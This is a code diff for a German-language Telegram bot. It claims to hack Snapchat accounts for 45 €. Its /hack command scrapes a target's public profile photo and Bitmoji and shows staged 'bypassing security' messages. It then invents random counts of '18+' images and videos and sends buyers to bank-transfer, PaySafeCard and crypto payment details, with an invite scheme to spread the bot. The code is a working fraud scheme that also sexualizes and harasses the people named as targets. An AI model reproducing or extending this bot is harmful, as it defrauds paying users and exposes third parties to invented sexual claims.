@@ -296,7 +296,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     text = (
         "🌟 Bitte Join zuerst den Kanal, um den Bot zu Nutzen ! 🌟\n\n"
-        "👉t.me/+QT6ghV4v5rZjNmQx\n\n"
+        "👉 t.me/+nMHJ1iyB1d0xZmUxqWjWY41lmMDk5\n\n"
         "📢 Nach dem Beitritt kannst du sofort starten:\n"
         "/hack Benutzername von dem Account. \n\n"
         "Kunden-Bewertung (https://t.me/+qICdaAr6lE4yMzZh) \n\n"
@@ -320,3 +320,263 @@ async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Noch keine Nutzer gespeichert.")
     else:
         await update.message.reply_text(f"📋 Gespeicherte Nutzer:\n\n{data}")
+
+# ---- HACK ----
+async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+
+    try:
+        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
+        if member.status in ["left", "kicked"]:
+            await update.message.reply_text(
+                "🌟 Bitte Betrrete zuerst den Kanal, um den Bot nutzen zu können! 🌟\n\n"
+                "👉t.me/+nMHJ1iyB1d0xZmUxqWjWY41lmMDk5"
+            )
+            return
+    except Exception as e:
+        print("Fehler bei get_chat_member:", e)
+        await update.message.reply_text("Fehler bei der Kanal-Überprüfung. Bitte versuche es später erneut.")
+        return
+
+    if not context.args:
+        await update.message.reply_text("Bitte gib den Snapchat-Benutzernamen ein, z.B. /hack Lina.123")
+        return
+
+    username = context.args[0]
+
+    # Use enhanced extraction function
+    exists, name, bitmoji_url, profile_photo_url = extract_snapchat_profile_data(username)
+
+    if not exists:
+        await update.message.reply_text(
+            f"Der Snapchat-Benutzername *{username}* wurde nicht gefunden.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+
+    msg = await update.message.reply_text("🚀 Starte den Vorgang...")
+    await asyncio.sleep(3)
+    await msg.edit_text("🔍 Search for user data...")
+    await asyncio.sleep(3)
+    await msg.edit_text("⚙️ Bypass security protocolse...")
+    await asyncio.sleep(3)
+    await msg.edit_text("📡 Access Private Details...")
+    await asyncio.sleep(3)
+    await msg.edit_text("🎭 Downloading Informations...")
+    await asyncio.sleep(3)
+
+    # Download Bitmoji and profile photo if available
+    bitmoji_downloaded = False
+    profile_downloaded = False
+
+    if bitmoji_url and isinstance(bitmoji_url, str):
+        bitmoji_filename = f"bitmoji_{username}.jpg"
+        bitmoji_downloaded = download_image(bitmoji_url, bitmoji_filename)
+
+    if profile_photo_url and isinstance(profile_photo_url, str):
+        profile_filename = f"profile_{username}.jpg"
+        profile_downloaded = download_image(profile_photo_url, profile_filename)
+
+    # Zufällige Zahlen generieren
+    bilder = randint(8, 12)
+    videos = randint(7, 8)
+
+    # Zahlen für späteren Abruf speichern
+    user_content_counts[user_id] = {"bilder": bilder, "videos": videos}
+
+    msg_text = (
+        f"👾 Wir haben den Benutzer ({username}) gefunden, und das Konto ist angreifbar! 👾\n\n"
+        f"👤 {name}\n"
+        f"🖼️ {bilder} Bilder als 18+ getaggt\n"
+        f"📹 {videos} Videos als 18+ getaggt\n"
+    )
+
+    # Add Bitmoji and profile info if found
+    if bitmoji_downloaded:
+        msg_text += f"🎭 Bitmoji extrahiert ✅\n"
+    if profile_downloaded:
+        msg_text += f"📸 Profilbild extrahiert ✅\n"
+
+    msg_text += (
+        f"\n💶 Um sofort Zugriff auf das Konto und den Mega Ordner zu erhalten, tätige bitte eine Zahlung von 45 € mit /pay.\n\n"
+        f"👉 Nach der Zahlung erhältst du hier Alles: https://mega.nz/folder/JU5zGDxQ#-Hxqn4xBLRIbM8vBFFFvZQ\n"
+        f"👉 Bei den Ersten Hack, bekommst du von den 40€ Rückerstattung von den 45€, NUR EINMALIG\n"
+        f"🎁 Oder verdiene dir einen kostenlosen Hack, indem du andere mit /invite einlädst.\n\n"
+    )
+    await msg.edit_text(msg_text)
+
+    # Do NOT send preview images or videos automatically anymore.
+    # The bot will inform users to use /pay to get access or contact the admin.
+
+    # Send Bitmoji and profile photo if available (optional - these are single images)
+    if bitmoji_downloaded:
+        try:
+            bitmoji_path = PROFILE_DIR / f"bitmoji_{username}.jpg"
+            with open(bitmoji_path, "rb") as f:
+                await context.bot.send_photo(user_id, photo=f, caption=f"🎭 {name}'s Bitmoji")
+        except Exception as e:
+            print(f"❌ Fehler beim Senden von Bitmoji: {e}")
+
+    if profile_downloaded:
+        try:
+            profile_path = PROFILE_DIR / f"profile_{username}.jpg"
+            with open(profile_path, "rb") as f:
+                await context.bot.send_photo(user_id, photo=f, caption=f"📸 {name}'s Profilbild")
+        except Exception as e:
+            print(f"❌ Fehler beim Senden von Profilbild: {e}")
+
+# ---- PAY ----
+async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [
+        [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
+        [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
+        [InlineKeyboardButton("🪙 Crypto Zahlungen (am schnellsten)", callback_data="pay_crypto")],
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)
+
+# ---- BUTTONS ----
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    cmd = query.data
+
+    info_refund = (
+        "\n\n⚠️ <b>Wichtig:</b> Bei deine  <u>ersten Hack</u> hast du eine "
+        "<b>5 Minuten Refund-Zeit</b>. Wenn du in dieser Zeit Stornierst, bekommst du <b>15 €</b> zurück.\n\n"
+        "📌 <b>Verwendungszweck:</b> Gib <u>dein Telegram-Username</u> an!"
+    )
+
+    if cmd == "pay_bank":
+        text = (
+            "🏦 <b>Banküberweisung</b>\n\n"
+            "Empfänger: Euro Hunter\n"
+           "IBAN: <code>LT62 3130 0101 0634 0669.</code>\n"
+            f"{info_refund}"
+            "\n\nBei Zahlung über Amazon, sende den Code an @OpaHunter ."
+            "\n\nTippe auf *Weiter*, auch wenn Fehler bei Empfänger Überüprüfung kommt."
+            "\n\nBitte sende nach der Zahlung ein Foto deines Zahlungsbelegs."
+        )
+    elif cmd == "pay_paysafe":
+        text = (
+            "💳 <b>PaySafeCard</b>\n\n"
+            "Bitte sende nur den 16-stelligen Code ins Chat:\n"
+            "<code>0000-0000-0000-0000</code>\n"
+            f"{info_refund}"
+            "\n\nDer Code wird überprüft und weitergeleitet."
+        )
+    elif cmd == "pay_crypto":
+        text = (
+            "🪙 <b>Crypto-Adressen :</b>\n\n"
+            "-Tippen, zum Kopieren.</code>\n"
+            "- BTC: <code>bc1q4qxfygq79xphmagy365d73d6z96pedxz9l3csf</code>\n"
+            "- ETH: <code>0x456F994998c7c36892e6E0dcd8A71a5e85dddc56</code>\n"
+            "- SOL: <code>FdJ6GL9ukKGau434JxwCKtQ6ArFMqtRGRoD771WmBCYy</code>\n"
+            f"{info_refund}"
+             "\n\nFalls du kein Crypto besitzt, kannst du es Gebührenfrei bei cryptovoucher.io kaufen."
+            "\n\nBitte sende hier ein Foto deines Zahlungsbelegs."
+        )
+    elif cmd == "pay":
+        keyboard = [
+            [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
+            [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
+            [InlineKeyboardButton("🪙 Crypto Zahlung (am Schnellsten)", callback_data="pay_crypto")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)
+        return
+    else:
+        await query.edit_message_text("Ungültige Auswahl.")
+        return
+
+    keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
+
+# ---- PHOTO (Beweis) ----
+async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    from_user = update.message.from_user
+    user_id = from_user.id
+
+    if user_id in user_proof_sent:
+        await update.message.reply_text("❌ Du kannst nur einmal einen Zahlungsbeweis senden.")
+        return
+
+    user_proof_sent.add(user_id)
+    photo = update.message.photo[-1]
+    caption = update.message.caption or ""
+
+    forward_text = (
+        f"📸 Neuer Beweis von @{from_user.username or from_user.first_name} (ID: {user_id})\n\n"
+        f"Bildunterschrift:\n{caption}"
+    )
+
+    try:
+        await context.bot.send_photo(
+            chat_id=ADMIN_CHAT_ID,
+            photo=photo.file_id,
+            caption=forward_text,
+            parse_mode=ParseMode.HTML,
+        )
+        await update.message.reply_text("✅ Dein Beweis wurde erfolgreich gesendet, wenn es Länger als 5min Dauert, kontaktiere @OpaHunter")
+
+        # Hinweis: Content wird nicht automatisch versendet. Admin prüft Beweis und gibt manuell frei.
+
+    except Exception as e:
+        print("Fehler beim Senden des Beweisfotos:", e)
+        await update.message.reply_text("❌ Fehler beim Senden des Beweisfotos.")
+
+# ---- TEXT (Paysafe-Code) ----
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text.strip()
+    paysafe_pattern = re.compile(r"^\d{4}-\d{4}-\d{4}-\d{4}$")
+    from_user = update.message.from_user
+    user_id = from_user.id
+
+
+    if paysafe_pattern.match(text):
+        if user_id in user_proof_sent:
+            await update.message.reply_text("❌ Du kannst nur einmal einen Zahlungsbeweis senden.")
+            return
+
+        user_proof_sent.add(user_id)
+        msg = f"🎫 Neuer Paysafe-Code von @{from_user.username or from_user.first_name}:\n<code>{text}</code>"
+        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg, parse_mode=ParseMode.HTML)
+        await update.message.reply_text("✅ Dein Paysafe-Code wurde erfolgreich gesendet!")
+
+        # Hinweis: Content wird nicht automatisch versendet. Admin prüft Beweis und gibt manuell frei.
+
+# ---- ADMIN: /sendcontent - Manuelles Senden für Tests ----
+async def send_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_CHAT_ID:
+        return
+
+    # Für Sicherheit: Admin muss prüfen; automatisches Versenden ist deaktiviert.
+    await update.message.reply_text("Hinweis: Automatisches Versenden von Preview-Medien ist deaktiviert. Verwende diese Funktion nicht, um private Inhalte zu verbreiten.")
+
+# ---- DUMMY INVITE/REDEEM/FAQ ----
+async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    msg = "🎁 Lade Freunde ein und erhalte einen Free Hack!\n\n🔗https://t.me/+ivL-4D0RDpUyMmYx"
+    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
+
+async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Das Einlösen von Credits ist aktuell nicht verfügbar.")
+
+async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    faq_text = (
+        "📖 *Häufig gestellte Fragen (FAQ)*\n\n"
+        "❓ Wie funktioniert das Ganze?\n"
+        "💬 Gib den Befehl /hack Benutzername ein.\n\n"
+        "❓ Wie lange dauert ein Hack?\n"
+        "💬 In der Regel 3–5 Minuten.\n\n"
+        "❓ Wie bezahle ich?\n"
+        "💬 Mit /pay nach dem Hack."
+    )
+    await update.message.reply_text(faq_text, parse_mode=ParseMode.MARKDOWN)
+
+# ---- MAIN ----
+def main():
+    print("🚀 Bot startet...")
+    keep_alive()
+    app_builder = ApplicationBuilder().token(TOKEN)
+    application = app_builder.build()
